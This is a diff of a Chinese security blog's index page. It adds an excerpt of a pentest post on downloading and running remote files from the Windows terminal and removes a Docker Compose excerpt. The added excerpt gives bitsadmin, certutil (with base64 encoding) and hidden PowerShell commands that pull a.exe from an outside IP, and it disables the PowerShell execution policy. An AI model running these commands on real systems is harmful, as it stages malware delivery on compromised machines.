@@ -83,6 +83,66 @@
 <hr style="height:1px;border:none;border-top:1px dashed #0066CC;" />
 <article>
     <header>
+        <h2><a href="http://wyb0.com/posts/win-terminal-download-and-exec-remote-file/">Windows终端下载文件和执行远程文件</a></h2>
+
+        
+        <div class="post-meta">
+            <div style="padding:5px 5px 2px 5px;">
+                <i class="fa fa-calendar fa-fw"></i>
+                <time>2018-02-06</time>
+                &nbsp;&nbsp;&nbsp;&nbsp;
+            
+
+                
+
+            
+                
+                
+                
+                    <i class="fa fa-folder fa-fw"></i>
+                    
+                        <a class="post-taxonomy-topic" href="http://wyb0.com/topics/pentest">Pentest</a>
+                    
+                
+                
+                &nbsp;&nbsp;&nbsp;&nbsp;
+                
+                
+                
+                    <i class="fa fa-tags fa-fw"></i>
+                    
+                        <a class="post-taxonomy-tag" href="http://wyb0.com/tags/intranet">intranet</a>
+                    
+                
+                
+            </div>
+        </div>
+    </header>
+
+    
+    <p style="max-height:130px;overflow:hidden;line-height:26px;position: relative;word-wrap: break-word !important;z-index:1;">
+        环境：Windows Server 2008 R2 Enterprise
+0x00 bitsadmin下载文件 bitsadmin /rawreturn /transfer getfile http://114.115.123.123/a.exe C:\Windows\Temp\a.exe bitsadmin /rawreturn /transfer getpayload http://114.115.123.123/a.zip C:\Windows\Temp\a.zip bitsadmin /transfer myDownLoadJob /download /priority normal http://114.115.123.123/a.exe C:\Windows\Temp\a.exe  0x01 certutil下载文件 保存在当前目录
+certutil -urlcache -split -f http://114.115.123.123/a.exe a.exe  有时会下载二进制文件的base64编码后的字符串，然后再解码
+本地：certutil -encode cc.exe base64.txt 目标：certutil -urlcache -split -f http://114.115.123.123/base64.txt 目标：certutil -decode base64.txt cc.exe  文件会以二进制形式缓存到目录：C:\Users\Administrator\AppData\LocalLow\Microsoft\CryptnetUrlCache\Content
+certutil -urlcache -f http://114.115.123.123/a.exe  0x02 powershell下载文件 有的时候PowerShell的执行权限会被关闭，需要使用如下的语句打开。
+C:&gt;powershell set-executionpolicy unrestricted
+powershell (new-object System.Net.WebClient).DownloadFile(&quot;http://114.115.123.123/a.exe&quot;,&quot;C:\Windows\Temp\a.exe&quot;) #-w hidden 下载后终端自动退出 powershell -w hidden -c (new-object System.
+    </p>
+
+    
+    <footer>
+        <a href="/posts/win-terminal-download-and-exec-remote-file/">Read more<i class="fa fa-angle-double-right fa-fw"></i></a>
+    </footer>
+    
+</article>
+
+
+            
+                
+<hr style="height:1px;border:none;border-top:1px dashed #0066CC;" />
+<article>
+    <header>
         <h2><a href="http://wyb0.com/posts/python-run-cmd/">Python中执行系统命令</a></h2>
 
         
@@ -351,64 +411,6 @@ simplexml_load_string.php
     
     <footer>
         <a href="/posts/middleware-security-configuration/">Read more<i class="fa fa-angle-double-right fa-fw"></i></a>
-    </footer>
-    
-</article>
-
-
-            
-                
-<hr style="height:1px;border:none;border-top:1px dashed #0066CC;" />
-<article>
-    <header>
-        <h2><a href="http://wyb0.com/posts/docker-compose/">Docker之Docker Compose</a></h2>
-
-        
-        <div class="post-meta">
-            <div style="padding:5px 5px 2px 5px;">
-                <i class="fa fa-calendar fa-fw"></i>
-                <time>2017-10-05</time>
-                &nbsp;&nbsp;&nbsp;&nbsp;
-            
-
-                
-
-            
-                
-                
-                
-                    <i class="fa fa-folder fa-fw"></i>
-                    
-                        <a class="post-taxonomy-topic" href="http://wyb0.com/topics/linux">Linux</a>
-                    
-                
-                
-                &nbsp;&nbsp;&nbsp;&nbsp;
-                
-                
-                
-                    <i class="fa fa-tags fa-fw"></i>
-                    
-                        <a class="post-taxonomy-tag" href="http://wyb0.com/tags/docker">docker</a>
-                    
-                
-                
-            </div>
-        </div>
-    </header>
-
-    
-    <p style="max-height:130px;overflow:hidden;line-height:26px;position: relative;word-wrap: break-word !important;z-index:1;">
-        0x00 关于docker compose 可以把docker-compose当作docker命令的封装，它是一个用来把 docker 自动化的东西，docker-compose可以一次性管理多个容器，通常用于需要多个容器相互配合来完成某项任务的场景。
-0x01 安装与卸载 https://docs.docker.com/compose/install
-0x02 一些常用命令  构建容器：docker-compose up -d 启动容器：docker-compose start 停止容器：docker-compose stop 重启容器：docker-compose restart kill容器：docker-compose kill 删除容器：docker-compose rm bash连接容器：docker-compose exec [services_name] bash 执行一条命令：docker-compose run [services_name] [command]  0x03 docker-compose简单应用  结构
-. ├── Dockerfile ├── docker-compose.yml └── src ├── app.py └── sources.list 1 directory, 4 files  Dockerfile
-FROM ubuntu:14.04.4 MAINTAINER reber &lt;1070018473@qq.com&gt; COPY ./src /code #将data挂载到容器的code WORKDIR /code RUN cp sources.list /etc/apt/sources.
-    </p>
-
-    
-    <footer>
-        <a href="/posts/docker-compose/">Read more<i class="fa fa-angle-double-right fa-fw"></i></a>
     </footer>
     
 </article>
